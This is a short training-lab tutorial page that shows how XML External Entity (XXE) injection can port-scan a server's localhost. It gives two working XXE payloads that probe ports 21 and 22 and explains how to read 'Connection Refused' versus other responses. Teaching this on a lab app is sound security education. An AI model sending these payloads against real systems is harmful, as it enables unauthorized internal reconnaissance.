---
title: "TCP Port Scan"
weight: 40
---

{{% notice note %}}
We will do these exercises on the Basic XXE (`/basic-xxe.do`) page.
{{% /notice %}}

We can use XXE to perform port scanning by defining an external dtd as the server and port we want to check. In the following submission we are checking if the FTP port is open.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:21">]>

<doc>&xxe;</doc>
```

![](/static/img/connection_refused.png)

When we compare that response to the one below which checks to see if SSH is open we can clearly see the changes when a port is open/closed.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">]>

<doc>&xxe;</doc>
```

![](/static/img/invalid_http.png)

You may see different responses if the port is open, so in general any response other than Connection Refused should be considered open.
